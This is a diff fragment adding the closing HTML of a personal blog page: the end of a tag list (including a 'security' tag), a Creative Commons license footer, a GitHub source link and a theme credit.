+              <a href="../../tag/security.html">security</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
